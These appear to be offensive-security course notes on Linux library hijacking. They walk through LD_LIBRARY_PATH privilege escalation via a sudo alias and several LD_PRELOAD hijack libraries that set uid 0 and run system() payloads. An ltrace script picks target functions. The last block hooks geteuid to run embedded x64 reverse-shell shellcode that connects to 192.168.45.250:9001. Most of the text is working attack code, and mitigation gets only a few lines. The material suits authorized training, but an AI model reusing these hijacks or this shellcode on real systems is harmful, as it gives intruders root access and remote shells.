1. Enumerate the symbols from the shared library.
2. Generate the header file and version script files.
3. Compile the source code into a shared library, using the generated version script files.

### Enhanced Bash Script

Here's the enhanced script:

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <input_shared_library.so> <output_shared_library.so>"
    exit 1
fi

INPUT_LIB=$1
OUTPUT_LIB=$2
HEADER="mylib.h"
VERSION_SCRIPT_BASE="mylib"
TMP_FILE="symbols.txt"
SOURCE="mylib.c"

# Extract function symbols from the shared library
readelf -s --wide $INPUT_LIB | grep FUNC | grep -v '@GLIB' > $TMP_FILE

# Generate header file
echo "Generating header file..."
echo "#ifndef MYLIB_H" > $HEADER
echo "#define MYLIB_H" >> $HEADER

# Initialize source file
echo "#include <stdio.h>" > $SOURCE
echo "#include \"$HEADER\"" >> $SOURCE
echo "int main() {" >> $SOURCE

# Process each line from the readelf output
while IFS= read -r line; do
    # Extract the symbol name and potential version information
    symbol=$(echo $line | awk '{print $8}')
    version=$(echo $symbol | grep -o '@.*')

    # Check if the symbol has version information
    if [[ -n $version ]]; then
        # Strip the '@' and use the version information to determine the map file
        base_symbol=$(echo $symbol | sed 's/@.*//')
        version_name=$(echo $version | sed 's/@//')
        map_file="${VERSION_SCRIPT_BASE}_${version_name}.map"

        # Append the symbol to the appropriate map file
        echo "Adding $base_symbol to $map_file..."
        if [ ! -f $map_file ]; then
            echo "MYLIB_${version_name} {" > $map_file
            echo "    global:" >> $map_file
            echo "        $base_symbol;" >> $map_file
            echo "    local:" >> $map_file
            echo "        *;" >> $map_file
            echo "};" >> $map_file
        else
            sed -i "/global:/a\        $base_symbol;" $map_file
        fi
    else
        # Append the symbol to the header file
        echo "void $symbol();" >> $HEADER
        echo "    $symbol();" >> $SOURCE
    fi
done < $TMP_FILE

# Finalize the header file
echo "#endif // MYLIB_H" >> $HEADER

# Finalize the source file
echo "    return 0;" >> $SOURCE
echo "}" >> $SOURCE

# Clean up
rm $TMP_FILE

echo "Header file generated: $HEADER"
echo "Version scripts generated: $(ls ${VERSION_SCRIPT_BASE}_*.map)"

# Compile the shared library
echo "Compiling the shared library..."
gcc -fPIC -c $SOURCE -o mylib.o

# Create the shared library
map_files=$(ls ${VERSION_SCRIPT_BASE}_*.map 2>/dev/null)
if [[ -n $map_files ]]; then
    gcc -shared -Wl,--version-script=${VERSION_SCRIPT_BASE}_1.0.map -o $OUTPUT_LIB mylib.o
else
    gcc -shared -o $OUTPUT_LIB mylib.o
fi

# Clean up object file
rm mylib.o

echo "Shared library created: $OUTPUT_LIB"
```

### Explanation

1. **Input Check:**
   - Ensures that the script is run with two arguments: the input shared library file and the output shared library file.

2. **Extract Function Symbols:**
   - Uses `readelf` to list the function symbols from the shared library and saves the output to a temporary file.

3. **Generate Header File:**
   - Creates the header file and initializes it with header guards.

4. **Initialize Source File:**
   - Creates the source file and includes the generated header file.

5. **Process Each Line:**
   - Reads each line from the `readelf` output, extracts the symbol name, and checks for version information.
   - If the symbol has version information, it strips the `@` and appends the base symbol to the appropriate map file.
   - If the symbol doesn't have version information, it appends the symbol to the header file and the source file.

6. **Finalize Files:**
   - Adds the closing guard to the header file.
   - Finalizes the source file by adding a main function that calls each symbol.

7. **Compile and Link:**
   - Compiles the source file into an object file.
   - Links the object file into a shared library, using the generated version script files if they exist.

8. **Clean Up:**
   - Removes the temporary files and object files.

### Running the Script

Make the script executable and run it with the input and output shared library as arguments:

```bash
chmod +x generate_shared_library.sh
./generate_shared_library.sh libinput.so liboutput.so
```

### Conclusion

This script automates the entire process of reading a shared library's symbols, generating the necessary header and version script files, compiling the source code, and creating a new shared library. This ensures that the new shared library includes all the necessary symbols and respects versioning and symbol visibility.

#### Enhanced code to create shared library

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <input_shared_library.so> <output_shared_library.so>"
    exit 1
fi

INPUT_LIB=$1
OUTPUT_LIB=$2
HEADER="mylib.h"
VERSION_SCRIPT_BASE="mylib"
TMP_FILE="symbols.txt"
SOURCE="mylib.c"

# Extract function symbols from the shared library
readelf -s --wide $INPUT_LIB | grep FUNC | grep -v '@GLIB' > $TMP_FILE

# Generate header file
echo "Generating header file..."
echo "#ifndef MYLIB_H" > $HEADER
echo "#define MYLIB_H" >> $HEADER

# Initialize source file
echo "#include <stdio.h>" > $SOURCE
echo "#include \"$HEADER\"" >> $SOURCE
echo "int main() {" >> $SOURCE

# Process each line from the readelf output
while IFS= read -r line; do
    # Extract the symbol name and potential version information
    symbol=$(echo $line | awk '{print $8}')
    version=$(echo $symbol | grep -o '@.*')

    # Check if the symbol has version information
    if [[ -n $version ]]; then
        # Strip the '@' and use the version information to determine the map file
        base_symbol=$(echo $symbol | sed 's/@.*//')
        version_name=$(echo $version | sed 's/@//' | sed 's/@//')
        map_file="${VERSION_SCRIPT_BASE}_${version_name}.map"

        # Append the symbol to the appropriate map file
        echo "Adding $base_symbol to $map_file..."
        if [ ! -f $map_file ]; then
            echo "MYLIB_${version_name} {" > $map_file
            echo "    global:" >> $map_file
            echo "        $base_symbol;" >> $map_file
            echo "    local:" >> $map_file
            echo "        *;" >> $map_file
            echo "};" >> $map_file
        else
            sed -i "/global:/a\        $base_symbol;" $map_file
        fi
    else
        # Append the symbol to the header file
        echo "void $symbol();" >> $HEADER
        echo "    $symbol();" >> $SOURCE
    fi
done < $TMP_FILE

# Finalize the header file
echo "#endif // MYLIB_H" >> $HEADER

# Finalize the source file
echo "    return 0;" >> $SOURCE
echo "}" >> $SOURCE

# Clean up
rm $TMP_FILE

echo "Header file generated: $HEADER"
echo "Version scripts generated: $(ls ${VERSION_SCRIPT_BASE}_*.map)"

# Compile the shared library
echo "Compiling the shared library..."
gcc -fPIC -c $SOURCE -o mylib.o

# Create the shared library
map_files=$(ls ${VERSION_SCRIPT_BASE}_*.map 2>/dev/null)
if [[ -n $map_files ]]; then
    echo "Linking with version scripts: $map_files"
    gcc -shared -Wl,$(for map in $map_files; do echo -n "--version-script=$map,"; done | sed 's/,$//') -o $OUTPUT_LIB mylib.o
else
    gcc -shared -o $OUTPUT_LIB mylib.o
fi

# Clean up object file
rm mylib.o

echo "Shared library created: $OUTPUT_LIB"

```

#### Try and find a .so file to use to hijack an application other than top

-  enumerate `/lib/x86_64-linux-gnu/libacl.so.1`
```bash
bash search.sh /lib/x86_64-linux-gnu/libacl.so.1 /usr/bin
Searching for binaries that use /lib/x86_64-linux-gnu/libacl.so.1 in /usr/bin...
Found: /usr/bin/smbclient
Found: /usr/bin/systemd-resolve
Found: /usr/bin/net
Found: /usr/bin/systemd-analyze
Found: /usr/bin/systemd-cgtop
Found: /usr/bin/systemd-path
Found: /usr/bin/systemd-socket-activate
Found: /usr/bin/busctl
Found: /usr/bin/systemd-delta
Found: /usr/bin/vim.tiny
Found: /usr/bin/install
Found: /usr/bin/systemd-stdio-bridge
Found: /usr/bin/hostnamectl
Found: /usr/bin/systemd-cat
Found: /usr/bin/systemd-mount
Found: /usr/bin/rsync
Found: /usr/bin/systemd-run
Found: /usr/bin/systemd-detect-virt
Found: /usr/bin/systemd-cgls
Found: /usr/bin/localectl
Found: /usr/bin/timedatectl
Found: /usr/bin/bootctl
```

#### Escalation of privileges using LD_LIBRARY_PATH and sudo

Add `alias` to `.bashrc`
```bash
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```
Then `source .bashrc`

#### 10.3.2.2 Extra mile

- Execute shell code by adding the c code from my rc4 encrypted daemonized shellcode runner
- compile and execute with sudo alias

### TO DO: Hijack another application


`LD_PRELOAD` is an environment variable in Unix-like operating systems that allows users to load shared libraries before others when executing a program. This feature can be exploited to perform a technique known as "LD_PRELOAD hijacking." This technique can be used for both legitimate purposes (e.g., debugging or performance monitoring) and malicious purposes (e.g., executing unauthorized code).

### How LD_PRELOAD Works

When a program starts, the dynamic linker/loader (`ld.so` or `ld-linux.so`) loads the shared libraries needed by the program. By setting the `LD_PRELOAD` environment variable, you can specify additional shared libraries to be loaded before any other shared libraries.

For example:
```sh
export LD_PRELOAD=/path/to/mylib.so
./myprogram
```

In this scenario, `mylib.so` is loaded before any other library when `myprogram` is executed. This can override functions from the original libraries with the implementations provided in `mylib.so`.

### Legitimate Uses of LD_PRELOAD

1. **Debugging and Profiling**: Developers can use `LD_PRELOAD` to load libraries that instrument code for debugging or performance analysis.
2. **Compatibility Layers**: Libraries can provide compatibility layers or shim libraries to adapt behavior without modifying the original program.
3. **Feature Augmentation**: New features can be added to existing binaries without altering the source code.

### Malicious Uses of LD_PRELOAD

1. **Credential Theft**: An attacker can use a malicious shared library to intercept and log sensitive information such as passwords.
2. **Privilege Escalation**: If an attacker can trick a privileged program into loading a malicious shared library, they can execute arbitrary code with elevated privileges.
3. **Data Tampering**: An attacker can alter the behavior of a program by overriding its functions, leading to data corruption or other malicious behavior.

### Example of LD_PRELOAD Hijacking

Here’s a step-by-step example of how an attacker could use `LD_PRELOAD` to hijack a function:

#### 1. Create a Malicious Shared Library

```c
// mylib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}

int open(const char *pathname, int flags) {
    printf("Hijacked open() called for file: %s\n", pathname);
    return -1; // always fail the open call
}
```

#### 2. Compile the Shared Library

```sh
gcc -fPIC -shared -o mylib.so mylib.c
```

#### 3. Set LD_PRELOAD and Execute the Target Program

```sh
export LD_PRELOAD=/path/to/mylib.so
./target_program
```

#### Result

When `target_program` attempts to call the `open` function, the version in `mylib.so` is called instead, which prints a message and fails the open call.

### Prevention and Mitigation

To mitigate the risk of `LD_PRELOAD` hijacking:

1. **Setuid Programs**: These programs should clear the `LD_PRELOAD` environment variable to avoid loading untrusted libraries.
2. **Environment Sanitization**: Ensure critical programs sanitize their environment to avoid malicious environment variables.
3. **Library Paths**: Use full paths to libraries and restrict write access to directories containing shared libraries to trusted users.

By understanding and properly configuring your system, you can prevent the misuse of `LD_PRELOAD` and protect your programs from potential hijacking attacks.

Using `ltrace` to find non-repeated function calls in a binary can help identify potential targets for `LD_PRELOAD` hijacking. Here's a step-by-step guide and a script to achieve this:

### Step-by-Step Guide

1. **Run `ltrace` to Trace Function Calls**:
   Use `ltrace` to monitor the function calls made by the binary. Identify a function that is called only once or a limited number of times, making it a suitable target for hijacking.

2. **Create a Malicious Shared Library**:
   Write a C program that creates a shared library to override the identified function. This program will use `fork()` to execute malicious code in a child process.

3. **Use `LD_PRELOAD` to Inject the Shared Library**:
   Set the `LD_PRELOAD` environment variable to load your malicious shared library before the original libraries.

### Script to Identify Non-Repeated Function Calls

Here's a script to trace function calls and find non-repeated ones:

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <binary>"
    exit 1
fi

BINARY=$1

# Run ltrace and capture function calls
ltrace -c ./$BINARY 2>&1 | awk '/^[^ ]/ {print $1}' | sort | uniq -c | sort -n | tee ltrace_output.txt

# Display potential hijackable functions (called only once)
echo "Functions called only once:"
awk '$1 == 1 {print $2}' ltrace_output.txt
```

### Boilerplate C Code for Hijacking

Here's some boilerplate C code that uses `fork()` and includes a place for adding shellcode. We'll use `geteuid()` as an example target function.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

int (*old_geteuid)(void);

void run_shellcode() {
    unsigned char shellcode[] = {
        /* Add your shellcode here */
    };

    intptr_t pagesize = sysconf(_SC_PAGESIZE);
    if (mprotect((void *)((intptr_t)shellcode & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC) != 0) {
        perror("mprotect");
        return;
    }

    int (*ret)() = (int(*)())shellcode;
    ret();
}

int geteuid() {
    if (fork() == 0) {
        run_shellcode();
        _exit(0); // Exit child process after running shellcode
    } else {
        wait(NULL); // Wait for child process to finish
        printf("HACK: returning from function...\n");
        return old_geteuid();
    }
}

void __attribute__((constructor)) init(void) {
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (!old_geteuid) {
        fprintf(stderr, "Error: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    printf("HACK: initialized\n");
}
```

### Compile the Shared Library

```sh
gcc -shared -fPIC -o mylib.so hijack.c -ldl
```

### Use `LD_PRELOAD` to Inject the Shared Library

```sh
export LD_PRELOAD=/path/to/mylib.so
./target_program
```

### Putting It All Together

1. **Run the script to find a non-repeated function call**:
   ```sh
   ./find_functions.sh target_program
   ```
2. **Identify a suitable function from the output**.

3. **Modify the C code to hijack the identified function**.

4. **Compile the shared library**:
   ```sh
   gcc -shared -fPIC -o mylib.so hijack.c -ldl
   ```

5. **Inject the shared library using `LD_PRELOAD`**:
   ```sh
   export LD_PRELOAD=/path/to/mylib.so
   ./target_program
   ```

This approach allows you to identify potential functions for hijacking and inject malicious behavior using `LD_PRELOAD`.

Certain C library functions in Linux are more susceptible to LD_PRELOAD hijacking because they are commonly used and can provide significant control over the program's behavior when hijacked. Here are some categories and examples of such functions:

### File I/O Functions
Hijacking these functions can allow an attacker to intercept and manipulate file access.

- `open`
- `fopen`
- `read`
- `write`
- `close`
- `fclose`
- `unlink`
- `fread`
- `fwrite`

### Network Functions
Hijacking these functions can allow an attacker to intercept and manipulate network communication.

- `socket`
- `connect`
- `accept`
- `send`
- `recv`
- `sendto`
- `recvfrom`
- `bind`

### Memory Management Functions
Hijacking these functions can allow an attacker to manipulate memory allocations.

- `malloc`
- `free`
- `calloc`
- `realloc`

### Process Control Functions
Hijacking these functions can allow an attacker to intercept and manipulate process behavior.

- `fork`
- `execve`
- `system`

### User and Group Management Functions
Hijacking these functions can allow an attacker to manipulate user and group permissions.

- `geteuid`
- `getegid`
- `setuid`
- `setgid`

### Time Functions
Hijacking these functions can allow an attacker to manipulate time-related behavior.

- `time`
- `gettimeofday`
- `clock_gettime`
- `sleep`

### Dynamic Library Functions
Hijacking these functions can allow an attacker to manipulate dynamic library loading.

- `dlopen`
- `dlsym`

### Example of Hijacking a Common Function (`open`)

Here’s an example of how to hijack the `open` function:

1. **Create the Hijacking Shared Library**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>

int (*old_open)(const char *pathname, int flags);

int open(const char *pathname, int flags) {
    if (fork() == 0) {
        // Child process: execute shellcode or custom logic
        printf("Hijacked open() called for file: %s\n", pathname);
        // Add your shellcode here or custom logic
        _exit(0);
    } else {
        // Parent process: wait for child to complete
        wait(NULL);
        // Call the original open function
        return old_open(pathname, flags);
    }
}

void __attribute__((constructor)) init(void) {
    old_open = dlsym(RTLD_NEXT, "open");
    if (!old_open) {
        fprintf(stderr, "Error: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    printf("Hijack library initialized.\n");
}
```

2. **Compile the Shared Library**

```sh
gcc -shared -fPIC -o hijack_open.so hijack_open.c -ldl
```

3. **Use `LD_PRELOAD` to Inject the Shared Library**

```sh
export LD_PRELOAD=/path/to/hijack_open.so
./target_program
```

Here's a C code example to hijack the `geteuid` function using `LD_PRELOAD`. This example demonstrates how to intercept the `geteuid` function call, use `fork()` to execute custom logic in a child process, and return the original function's result in the parent process.

### Hijacking `geteuid` Function

1. **Create the Hijacking Shared Library**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dlfcn.h>

uid_t (*original_geteuid)(void);

void run_custom_logic() {
    // Example custom logic: create a file
    system("touch /tmp/hijacked_geteuid.txt");
}

uid_t geteuid(void) {
    if (fork() == 0) {
        // Child process: execute custom logic
        run_custom_logic();
        _exit(0); // Exit the child process
    } else {
        // Parent process: wait for child to complete
        wait(NULL);
        printf("HACK: returning from geteuid()\n");
        // Call the original geteuid function
        return original_geteuid();
    }
}

void __attribute__((constructor)) init(void) {
    // Get the original geteuid function
    original_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (!original_geteuid) {
        fprintf(stderr, "Error: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    printf("HACK: geteuid hijack initialized\n");
}
```

2. **Compile the Shared Library**

```sh
gcc -shared -fPIC -o hijack_geteuid.so hijack_geteuid.c -ldl
```

3. **Use `LD_PRELOAD` to Inject the Shared Library**

```sh
export LD_PRELOAD=/path/to/hijack_geteuid.so
./target_program
```

### Explanation

- **Dynamic Library Loading (`dlfcn.h`)**:
  - `dlsym(RTLD_NEXT, "geteuid")` is used to get the original `geteuid` function address. This allows the hijacked function to call the original function after executing custom logic.
  
- **Constructor Attribute**:
  - The `init` function is marked with `__attribute__((constructor))` to ensure it runs when the shared library is loaded. This initializes the original `geteuid` function pointer.
  
- **Custom Logic in Forked Process**:
  - The `fork()` system call is used to create a child process. The child process runs the custom logic defined in `run_custom_logic()`, and then exits.
  - The parent process waits for the child process to complete using `wait(NULL)` and then calls the original `geteuid` function to return its result.

### Custom Logic

In this example, the custom logic is to create a file `/tmp/hijacked_geteuid.txt`. You can replace the `run_custom_logic` function with any code or shellcode you want to execute in the child process.

This code intercepts the `geteuid` function call, allowing you to execute custom logic in a child process before returning the original function's result in the parent process. Use this code responsibly and only for educational purposes or authorized testing.

### Hijack geteuid

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <dlfcn.h>

uid_t (*original_geteuid)(void);

void run_custom_logic() {
    // Example custom logic: create a file
    system("touch /tmp/hijacked_geteuid.txt");
}

void execute_shellcode() {
    unsigned char buf[] =
        "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
        "\x48\xb9\x02\x00\x23\x29\xc0\xa8\x2d\xfa\x51\x48\x89\xe6"
        "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
        "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
        "\x89\xe6\x0f\x05";

    intptr_t pagesize = sysconf(_SC_PAGESIZE);
    if (mprotect((void *)((intptr_t)buf & ~(pagesize - 1)), pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        exit(EXIT_FAILURE);
    }
    int (*ret)() = (int (*)())buf;
    ret();
    exit(0); // Ensure child process exits after execution
}

uid_t geteuid(void) {
    if (daemon(0, 0) == -1) {
        perror("daemon");
        return -1;
    }

    if (fork() == 0) {
        execute_shellcode();
    } else {
        // Parent process: wait for child to complete
        wait(NULL);
        printf("HACK: returning from geteuid()\n");
        // Call the original geteuid function
        return original_geteuid();
    }

    return -1; // In case of any failure
}

void __attribute__((constructor)) init(void) {
    // Get the original geteuid function
    original_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (!original_geteuid) {
        fprintf(stderr, "Error: %s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    printf("HACK: geteuid hijack initialized\n");
}

```